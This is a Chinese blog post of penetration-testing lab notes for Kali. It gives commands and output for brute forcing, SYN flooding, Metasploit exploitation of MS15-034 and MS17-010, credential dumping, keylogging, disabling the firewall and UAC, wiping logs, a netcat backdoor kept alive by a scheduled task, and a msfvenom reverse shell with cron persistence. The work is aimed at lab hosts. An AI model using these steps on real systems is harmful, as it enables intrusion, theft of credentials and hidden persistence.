---
author: Hugo Authors
title: kali
date: 2023-12-25
description:  网络基础知识
series: 
  - 网络安全基础

---

kali使用

<!--more-->
# 基本命令
```
sudo -i   登陆超级用户
passwd root   设置root密码
然后用root用户登录
ifconfig  查看IP地址信息（更改ip地址后需要断开重连就会更新了）
```
## nmap 端口扫描结果
一款开源的网络探测器
- 基本用法
```
nmap[扫描类型][选项]<扫描目标>
nmap 192.168.10.142（目标主机地址） 端口扫描结果
man nmap(查看nmap的手册)
```
- 扫描类型
  - 扫描方式
    - s（扫描）
    - \-sS，TCP半开扫描（只发SYN包），速度快（默认） 
      - \-sS \-O（操作系统），探测目标主机的操作系统
      - \-sS \-p（端口），对多个端口进行扫描，端口之间用`,`隔开，也可以使用使用连续`-`数字
    - \-sT，TCP全开扫描（尝试全连接），结果更准确
    - \-sU，UDP扫描，用于DNS、SNMP
    - \-sP，扫描网段，显示此网段有哪些主机是开放的
    - \-sV（扫描后会多一行VERSION），扫描目标的软件版本
- 端口状态
  - filtered：被过滤的（可能被防火墙拦截了）
  - open：开放的
  - closed：关闭的
  - unfiltered：未被过滤的
# 辅助攻击
## 暴力破解
### crunch字典工具
- 基本用法
```
crunch 最小长度 最大长度 素材字符-o字典文件
crunch 6 6 0123456789 // 6位传数字密码
crunch 6 8 Abc1234    // 由Abc1234随机组成的6~8位密码
```
### hydra爆破工具
开源攻击工具
- 基本用法
```
hydra -l 用户名 -P 密码字典文件 目标地址 服务类型
hydra -l Administrator -P pass.txt 192.168.10.142 rdp
```
- 常用选项
  - \-l：指定用户名
  - \-L：指定用户名字典文件
  - \-p：指定密码
  - \-P：指定密码字典文件
  - \-o：将结果输出到指定文件

## DoS和DDoS
### DoS 拒绝服务
- 攻击概述：
  - 通过各种手段，最终导致目标系统崩溃、失去响应
  - 从而使目标系统不能为正常的用户提供资源或对应的功能
- 常见的DoS攻击方式
  - SYN Flood泛洪
    - 利用TCP三次握手的缺陷来攻击对方主机
  - Ping Flood泛洪
  - UDP Flood 泛洪

#### hping3工具
- 可想目标主机发送任意TCP/IP协议数据包的一款开源的安全工具
- 也用于扫描/防火墙测试/路由追踪/协议分析等场景
- 常用选项
  - \-p：指定目标端口
  - \--syn：设置SYN标记（-S）
  - \--flood：泛洪，尽最快发送数据包，不显示回复
```
hping3 --syn --flood -p 3389 192.168.10.142 //SYN包泛洪测试
ctrl+c    //停止
```
### DDoS
- 分布式拒绝服务
  - 典型的流量攻击，攻击方的主机数量呈现规模化
  - 通常由分布在不同网络、不同位置的成千上万的主机组成攻击方（通常称为botnet僵尸网络），被同一发起者所控制
  - 攻击强度大
  - 防御的难度也大
### 防御DoS/DDoS攻击
- 提高服务方的交付能力
  - 减少服务配置的等待时间
  - 优化单一客户机的并发相应策略
  - 更换高性能设备
  - 增加网络带宽
  - 采用负载均衡架构
  - 部署CDN内容分发网络
- 部署专用软硬件防御产品
  - 冰盾防火墙
  - 流量清洗/DDoS高防IP
  - IDS入侵防御设备
  - 抗DDoS专用防火墙设备


# 渗透测试
https://nvd.nist.gov/
https://www.cnvd.org.cn/
## 概述
  - 渗透测试是什么
    - 是一种通过模拟攻击的技术与方法，打破目标系统的安全防御，并获得目标系统控制访问权的安全测试方法
  - 为什么要进行渗透测试
    - 新系统可能存在未知的安全风险
    - 企业更需要未雨绸缪，而不是亡羊补牢
    - 渗透测试后，如果系统为被攻破，证明之前的安全防御是有效的
    - 渗透测试可以有效的评估系统的安全状态，并该处合理的改进方案
  - 渗透测试的目的
    - 模拟侵入系统获取机密信息
    - 将入侵过程和细节产生报告提供用户
    - 确定用户系统存在的安全威胁，完善安全防御，降低安全风险
## 原则和目标分类
  - 渗透测试的原则
    - 应渐进并且逐步深入，尽可能减少对业务的影响
    - 渗透测试的最大风险：测试过程中对业务产生的影响
    - 渗透测试的合规性：符合规范和法律要求是渗透测试的必要条件
  - 渗透测试的目标分类
    - 针对主机操作系统渗透：Windows、Linux…………
    - 针对数据库系统渗透：MYSQL、MS-SQL…………
    - 针对应用系统渗透：PHP组成的网站…………
    - 针对网络设备渗透：防火墙、路由器、交换机…………
## 渗透测试标准与流程
  - 渗透测试的七个阶段
    - PTES：渗透测试执行标准
      - 定义一次真正的渗透测试过程
      - 渗透测试过程分为七个阶段，并在每个阶段定义不同的扩展级别，选择那种级别由被测试客户决定
  1. 前期交互阶段
    - 事前交互
      - 明确范围：IP、域名、云平台、起止时间
      - 明确规则：目标系统介绍、重点保护对象及特性、相关部门接口人？是否允许数据破坏？是否允许阻断业务正常运行？
      - 确定目标：web应用？人员权限管理漏洞？
  2. 信息收集阶段
    - 信息收集
      - 信息收集是渗透攻击的前提
      - 信息收集工具：Nmap、OpenVAS…………
      - 主动扫描：语言的类型、服务器的类型、目录的结构、使用的软件、数据库类型
      - 开放搜索：人员信息（域名注册人员信息、web应用中网站发帖人的id、管理员姓名）、后台管理页面、默认账号
  3. 威胁建模阶段
  4. 漏洞分析阶段
  5. 渗透攻击阶段
  6. 后渗透攻击阶段
  7. 报告阶段
  

# OpenVAS
- OpenVAS
  - 是一个开源的全功能的漏洞扫描评估系统，是Nessus项目分支
  - 功能包括非认证测试、认证测试、各种互联网和工业协议、大规模扫描的性能调整等
  - 漏洞库持续更新
  - https://github.com/greenbone/openvas-scanner/

kali默认没有安装OpenVAS，在线安装并初始化漏洞列表需要3~5小时
- 登录预先准备好的系统然后用物理机访问`https://192.168.10.224:9392`登陆用户名和密码都是admin

- 执行扫描任务步骤
  - 第一步：添加扫描端口
  - 第二步：添加扫描目标
  - 第三步：执行扫描任务
  - 第四步：检查扫描结果
  - 第五步：提取检测报告
# Msfasploit Framework
- 一款开源的安全漏洞检测工具，简称MSF
  - 可以收集信息、探测系统漏洞、执行漏洞利用测试等，为渗透测试/攻击编码和漏洞研究提供了一个可靠平台
  - 集成数千个漏洞利用、辅助测试模块，并保持持续更新
  - 官方网站:https://metasploit.com/
## 常用模块
- 辅助模块Auxiliary
  - 不直接在测试者和目标主机之间建立访问
  - 只负责执行扫描、嗅探、指纹识别、爆破等相关功能以辅助渗透测试
- 漏洞利用Exploits
  - 利用目标系统、应用或者服务中的安全漏洞进行攻击行为
  - 包括用于破坏系统安全的攻击代码，每个漏洞都有相应的攻击代码
- 攻击载荷Payloads
  - 一般是一段代码，被渗透攻击模块通过安全漏洞植入目标主机中并运行，主要用来与目标主机之间建立一个稳定的连接。可返回Shell或进行程序注入等操作
- 后渗透模块Post
  - 该模块主要用于在取得目标系统远程控制权后，进行一系列的后渗透攻击动作，如获取敏感信息、实施跳板攻击等
## 核心命令
- 执行msfconsole进入控制台以后
  - ？———— 获取帮助
  - exit————退出MSF控制台
  - back————返回上一级
  - show————查看模块或相关信息
  - search————搜索模块
  - use————使用模块
  - options————列出当前模块地选项
  - set————设置模块选项
  - run或exploit————运行当前模块

## CVE-2015-1635（MS15-034）漏洞
- HTTP.sys RCE漏洞
  - 漏洞存在于HTTP协议堆栈（HTTP.sys）中，攻击者只要发送恶意http请求数据包，就可能远程读取IIS服务器的内存数据，或使服务器系统蓝屏崩溃
  - 漏洞名称：CVE-2015-1635（允许远程执行代码漏洞）
  - 安全公告：MS15-034
- 影响系统
  - Windows 7/8/8.1
  - Windows Server 2008/2008 R2/2012/2012 R2
- POC脚本检测
  - Proof of Concept“观点证明”
  - 一段验证漏洞的程序，使我们能够确认这个漏洞是真实存在的
  - 脚本上传
    - 上传cve-2015-1635.poc到kali系统/root目录下
# 漏洞检测
## 两种漏洞检测
1. 利用脚本
    - `第一步`：POC脚本检测
      - 上传cve-2015-1635.poc到kali系统
      - 修改cve-2015-1635.poc文件中的ipaddr为windows靶机地址
      ```
      cat cve-2015-1635.poc     查看文件
      ```
      - 使用python执行POC脚本
      ```
      [root]python2 cve-2015-1635.poc
      [*]Audit Started     //审计开始
      [!!]Looks VULN      //看起来是脆弱的
      ```
2. 利用软件形成检测报告从而知道其中漏洞
    - OpenVAS

## `第二步`搜索CVE-2015-1635或MS15-034
```
[root]msfconsole
msf6 > search MS15-034    //或CVE-2015-1635
   0  auxiliary/dos/http/ms15_034_ulonglongadd  //攻击
   1  auxiliary/scanner/http/ms15_034_http_sys_memory_dump  //扫描 
```
## `第三步`使用 1 先做扫描
```
msf6 > use 1    //执行扫描
> set rhosts 192.168.10.142   //准备对此IP进行扫描
> run       //执行


[+] Target may be vulnerable...       //目标可能是脆弱的
```
## `第四步`退出扫描，切换攻击
```
msf6 > use 0    //执行攻击
> set rhosts 192.168.10.142   //准备对此IP进行攻击
> run       //执行

[*] DOS request sent          //DOS请求已发送
[*] Scanned 1 of 1 hosts (100% complete)    //扫描1个主机已完成
[*] Auxiliary module execution completed    //辅助模块执行完成

```
执行完这些命令后如果你的windows2008具有这个漏洞就会出现蓝屏情况

## `第五步`第一种漏洞防御
这个漏洞是对你的主机的输出缓存漏洞进行攻击的，我们将它关掉就可以实现防御

关闭内核缓存后，再执行攻击命令就不会出现蓝屏情况了

## `第六步`再次发起漏洞利用，发现靶机不蓝屏了

## 第二种漏洞防御
`第七步`重启内核缓存

`第八步`利用漏洞防御补丁来进行防御
- 针对MS15-034漏洞进行防御
- 上传Windows6.1-KB3042553-x64-2008R2.msu（微软官方网站下载）
- 安装后系统会自动重启
- `第九步`装完后对系统漏洞进行检测
```
msf6 > use 1    //执行扫描
> set rhosts 192.168.10.142   //准备对此IP进行扫描
> run       //执行


[-] Target is not vulnerable    //目标可能不在脆弱了

```
- `第十步`再次使用POC脚本检测
```
[root]python2 cve-2015-1635.poc

  
[*] Audit Started     //开始审计
[*] Looks Patched     //看起来已修补过
```
## CVE-2017-0143（MS17-010）漏洞
- 永恒之蓝
  - 漏洞通过TCP的445和139端口，利用SMB远程代码执行漏洞
  - 攻击者可以在目标系统上执行任意代码
- 影响系统
  - Windows 7/8/8.1/10
  - Windows Server 2008/2012/2016
- 扫描漏洞和攻击漏洞步骤都是一样的
### 获取账号密码
- 第一种
  - 当执行完攻击脚本后会进入
  ![](/images/获取的用户名密码.png)
  - 现在最前面的就是用户名，后面发白的部分就是明文密码（第三个`:`到第四个`:`之间就是密码的明文加密
  - 明文密码可以使用一个网站来进行解密：`https://www.cmd5.com/`破解MD5弱密码
- 第二种获取密码
  - 加载kiwi模块，通过kiwi模块获取用户口令
  ```
  meterpreter > load kiwi     //加载kiwi
  meterpreter > creds_all     //读取系统中的账户信息 
  只有当内边的用户将用户名密码输入并开机，那么我们就可以通过监察内存来获得用户名密码
  ```
  ![](/images/内存用户名密码.png)
### 进程迁移
```
meterpreter > getuid    //获取用户信息
Server username: NT AUTHORITY\SYSTEM


meterpreter > ps -S "explorer"      //查看进程
Filtering on 'explorer'

Process List
============

 PID   PPID  Name        Arch  Session  User              Path
 ---   ----  ----        ----  -------  ----              ----
 3000  1784  explorer.e  x64   1        WIN-5MQI51VLCDC\  C:\Windows\Explor
             xe                         Administrator     er.EXE

meterpreter > migrate 3000        //进程迁移
[*] Migrating from 1080 to 3000...    //从1052迁移到5452
[*] Migration completed successfully.   //迁移成功完成

meterpreter > getuid            //再次获取用户信息
Server username: WIN-5MQI51VLCDC\Administrator

```
- explorer进程是系统进程，稳定，Administrator权限

### 开启键盘记录
```
meterpreter > run post/windows/capture/keylog_recorder 

[*] Keystrokes being saved in to /root/.msf4/loot/20231227154427_default_192.168.10.142_host.windows.key_039902.txt

//在win2008打开记事本，输入任意内容
//在kali中重新打开一个终端

[root]cat /root/.msf4/loot/20231227154427_default_192.168.10.142_…………

asd
asdasasdgadfgsdfhfghfgh       //windows2008输入的内容

```
### 设置防火墙
```
meterpreter > shell   //切换到目标主机的命令行终端
C:\Windows\system32>netsh advfirewall set allprofiles state off
//关闭防火墙
C:\Windows\system32>netsh advfirewall set allprofiles state on
//开启防火墙
C:\Windows\system32>netsh firewall add portopening tcp 444 backdoor 
enable all
//添加入站规则，规则名backdoor 协议TCP 端口444

```
### 关闭用户账户控制————操作注册表关闭UAC
- UAC：User Account Control 用户账户控制，是windows在操作系统中一种安全控制机制使用UAC，可以防止未经授权应用程序的自动安装，组织恶意程序
- ADD 添加一个注册表项
  - /v创建键值
  - /t键值类型
  - /d键值的值
  - /f强制覆盖
```
C:\Windows\system32>reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
```
- 使用clearev命令，清除安全日志
  - 完成清除后，目标主机的安全日志为空
```
meterpreter > clearev
[*] Wiping 446 records from Application...
[*] Wiping 1747 records from System...
[*] Wiping 1055 records from Security...
```
  ![](/images/清除日志后的结果.png)

### 持久性后门程序植入
- 上传后门程序植入
```
meterpreter > upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32
//nc.exe  瑞士军刀

[*] uploading  : /usr/share/windows-binaries/nc.exe -> C:\windows\system32
[*] uploaded   : /usr/share/windows-binaries/nc.exe -> C:\windows\system32\nc.exe


meterpreter > shell

Process 1540 created.
Channel 2 created.
Microsoft Windows [�汾 6.1.7601]
��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����



C:\Windows\system32>chcp 65001

chcp 65001
Active code page: 65001



C:\Windows\system32>schtasks /create /tn "nc" /ru system /tr "c:\windows\system32\nc.exe -Ldp 444 -e cmd.exe" /sc onstart
schtasks /create /tn "nc" /ru system /tr "c:\windows\system32\nc.exe -Ldp 444 -e cmd.exe" /sc onstart

SUCCESS: The scheduled task "nc" has successfully been created.
```

- 然后用nc连接后门程序
```
┌──(kali㉿kali)-[~]
└─$ nc 192.168.10.142 444

Microsoft Windows [�汾 6.1.7601]
��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����


C:\Windows\system32>hostname   

hostname
WIN-5MQI51VLCDC
```

# 对Linux的渗透
## ssh
- SSH是基于应用层的安全协议
- SSH是专为远程登陆和其他网络服务提供安全性的协议
- SSH提供基于密码、基于密钥的两种级别的安全验证
- SSH传输的数据会进行加密，可以有效防止远程过程中的信息泄露问题
- SSH传输的数据时会进行数据压缩，可以加快传输的速度
### SSH暴力破解工具
- Hydra、Medusa、msf
- 大部分攻击都是针对Linux服务器默认管理账号root，攻击者主要使用admin、root、123456等常见弱密码进行暴力破解
- 少部分攻击是针对Linux服务器上常见应用程序使用的用户名
- 攻击者不仅使用常见通用弱密码，还会将用户名当最密码进行攻击
### SSH爆破
#### 创建字典
- 手写一个简单的字典，或者从网上白嫖
```
vim /root/passwd              //创建一个实验用的密码本
```
#### 查找MSF辅助爆破脚本
```
┌──(root㉿kali)-[~]
└─# msfconsole -q                 //进入MSF控制台
msf6 > search ssh_login         //搜索ssh登录相关程序相关脚本

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  auxiliary/scanner/ssh/ssh_login                          normal  No     SSH Login Check Scanner
   1  auxiliary/scanner/ssh/ssh_login_pubkey                   normal  No     SSH Public Key Login Scanner


Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/ssh/ssh_login_pubkey                                          
```
#### 使用辅助脚本进行SSH爆破
```
msf6> use 0
set username msfadmin         //设置用户名
set pass_file /root/passwd      //设置密码本
set rhosts 192.168.10.143       //设置攻击目标
```
#### 查看会话、切换会话
```
msf6 auxiliary(scanner/ssh/ssh_login) > sessions //显示所有会话

Active sessions
===============

  Id  Name  Type         Information  Connection
  --  ----  ----         -----------  ----------
  1         shell linux  SSH root @   192.168.10.224:43951 -> 192.168.10.14
                                      3:22 (192.168.10.143)

msf6 auxiliary(scanner/ssh/ssh_login) > sessions 1  //切换到会话1
[*] Starting interaction with 1...
whoami
```
## Exploit漏洞利用
### 漏洞利用VSFTPD
- vsftpd_234_backdoor（笑脸漏洞），允许攻击者任意用户登录，以root权限执行任意命令
  - 用户名以“笑脸”结尾，如xx:)、oo:)
  - 密码任意输入
  - 成功后开启6200端口，执行任意命令
```
msf6> search vsftpd
msf6> use 0
> set rhosts 192.168.10.143
> run
…………
whoami
ifconfig
```

## Linux后门
### Msfvenom后门（毒液）
#### 什么是Msfvenom
  - Msfvenom
    - Msfvenom是MSF框架配套的攻击载荷生成器
    - 可以用来生成木马程序，并在目标机上执行，在本地监听上线
  - 部分参数
    - -p：选择一个载荷
    - -f：生成的文件格式，elf(Linux下执行文件)exe（Windows下执行）
    - -l：host监听地址
    - -l：port监听端口
    - -o：输出文件名
    - -h：帮助
#### Msfvenom生成后门文件
  - 第一步：在kali生成后门文件
    ```
    ┌──(root㉿kali)-[~]
    └─# msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.10.224 lport=4444 -f elf -o shell

    ```
  - 第二步：确保开启linux靶机的root用户，并设置密码root（可以爆破以更改）
  - 第三步：在暴力破解成功的情况下，通过kal将后门文件发送到目标主机
    - 在kali中发送后门文件致目标靶机的/mnt/下
    ```
    ┌──(root㉿kali)-[~]
    └─# scp shell root@192.168.10.143:/mnt   
    ```
    - 暴力破解看看后门文件是否存在
    - 上传可能会报错，由于kali缺少配置导致的，按照以下步骤修复
    ```
    ┌──(root㉿kali)-[~]
    └─# mkdir .ssh          //创建 .ssh目录

    ┌──(root㉿kali)-[~]
    └─# vim .ssh/config       //在.ssh目录下创建config文件并进行编辑
    ```
    - config文件中添加以下内容
    ```
    Host *
    HostkeyAlgorithms +ssh-rsa
    PubkeyAcceptedKeyTypes +ssh-rsa
    ```
  - 第四步：控制靶机，添加执行权限
    ```
    ls -l /mnt
    chmod 755 /mnt/shell
    ```
  - 第五步：控制靶机，后台运行后门程序
    ```
    /mnt/shell &
    ```
  - 第六步：kali中进入MSF，使用侦听脚本，建立连接
    ```
    ┌──(root㉿kali)-[~]
    └─# msfconsole -q
    msf6 > use exploit/multi/handler      //使用侦听程序
    [*] Using configured payload generic/shell_reverse_tcp

    msf6 exploit(multi/handler) > set lhost 192.168.10.224    //设置监听地址（监听的地址，本机地址）
    lhost => 192.168.10.224
    msf6 exploit(multi/handler) > set lport 4444      //设置监听端口
    lport => 4444
    msf6 exploit(multi/handler) > set payload linux/x86/meterpreter/  reverse_tcp     //设置载荷
    msf6 exploit(multi/handler) > run     //运行
    ```
    - 如果远程连接不上，爆破多次执行/mnt/shell&
    - 进入反弹连接获取用户信息
      ```
      meterpreter >         //在这个目录下就能执行想执行的文件了
      ```
### 创建计划任务自动运行后门程序
#### 创建计划任务
- Linux crontab命令
  - crontab：计划任务，用来定期执行程序的命令
  - crontab -e：编辑计划任务
  - crontab -l：显示计划任务

  在靶机中执行
  ```
  crontab -l
  # m h dom mon dow command       //分 时 日 周 月 命令
   30 6 *   *   *   命令          //每天6点30分执行命令
   30 6 *   *   1-5 命令          //周1-5的六点三十分执行命令
   30 6 1   *   *   命令          //每月第一天六点三十分执行命令
   *  * *   *   *   命令          //每分钟执行一次命令
  ```
- 第一步：再靶机上创建计划任务
  - -e：执行文字编辑器来设定计划任务，内定文字编辑器是vi
  - EDITOR=vim：指定编辑器为vim
    ```
    EDITOR=vim crontab -e     //编写计划任务
    * * * * * /mnt/shell&
    ```
- 第二步：验证计划
    ```
    ┌──(root㉿kali)-[~]
    └─# msfconsole -q
    msf6 > use exploit/multi/handler      //使用侦听程序
    [*] Using configured payload generic/shell_reverse_tcp

    msf6 exploit(multi/handler) > set lhost 192.168.10.224    //设置监听地址（监听的地址，本机地址）
    lhost => 192.168.10.224
    msf6 exploit(multi/handler) > set lport 4444      //设置监听端口
    lport => 4444
    msf6 exploit(multi/handler) > set payload linux/x86/meterpreter/  reverse_tcp     //设置载荷
    msf6 exploit(multi/handler) > run     //运行
    ```
- 会话放入后台运行
  - background
    - 在渗透的时候，有时需要执行其他任务，为了执行新任务，需要将当前的Meterpreter会话切换到后台，这时就需要用到background命令
    ```
    meterpreter > background      //将会话放入后台
    sessions          //显示所有会话
    sessions 4        //切换会话
    然后重新运行
    meterpreter > run
    ```
## Linux安全加固
### Linux安全基线
- 指的是使Linux各项配置都符合安全要求的基本标准
  - 账号/密码：口令复杂度/wheel组……
  - SSH登陆控制：禁root/该端口/密码/密钥验证……
  - 文件权限控制
  - 内核参数控制
### 系统加固的影响
- 可能会影响用户的使用习惯，影响系统易用性

|加固项|建议措施|易用性影响|是否默认|
|-|-|-|-|
|登录失败次数限制|密码输错3次，锁定1分钟|锁定后需等待1分钟以后再试|是|
|用户umask限制|设为077，新建文档仅自己可用|需要额外为文档指定权限|是|
|su使用限制|只允许root和wheel组的用户使用su|其他用户使用su会失败|是|
|SSH强加密|不支持CBC/MD5/SHA1弱算法，改为支持CTR/SHA2强算法|低版本的Xshel1/Putty客户端无法登入|是|
|禁止root远程SSH|禁止root从网络通过SSH登入|要先以普通用户SSH登入，再切换或提权|否|
|命令行超时限制|闲置5分钟自动退出|超时后需重新登录|否|
|密码复杂度限制|不少于8位，字符组合3/4原则|不能为用户设置简单口令|否|
|密码有效期|最长90天，过期前7天提示|过期后必须改密码才能进入系统|否|

### 典型加固指导
#### 禁止root远程SSH
- 调整sshd服务端配置文件
  ```
  # vim /etc/ssh/sshd_config

  Port 12345      //修改默认连接端口为12345
  LoginGraceTime 1m         //修改用户登录验证过程的时长1分钟
  PermitRootLogin no          //禁止root远程登陆（不影响sudo提权）
  MaxAuthTries2             //单次连接最多重试两次验证
  AllowUsers zhangsan@192.168.10.224    //添加白名单，仅允许zhangsan用户在192.168.10.224上访问

  # /etc/init.d/ssh restart       //重启ssh服务
  ```
#### 命令行超时限制
- 针对后续登录的所有用户
  - 调整/etc/profile文件中的TMOUT变量值
- 针对通过SSH登录的用户
  - 调整/etc/ssh/sshd_config文件中的ClientAlivelnterval值
```
vim /etc/profile
……
export TMOUT=300            //闲置300秒退出
```
#### 密码有效期限制
- 调整/etc/login.defs配置文件
  - 此文件定义了useradd的默认设置，会影响后续新创建的用户
  - 若有需要，也可能chage命令直接设置特定用户的密码参数
    ```
    # vim /etc/login.defs       //设置
    ```
#### 
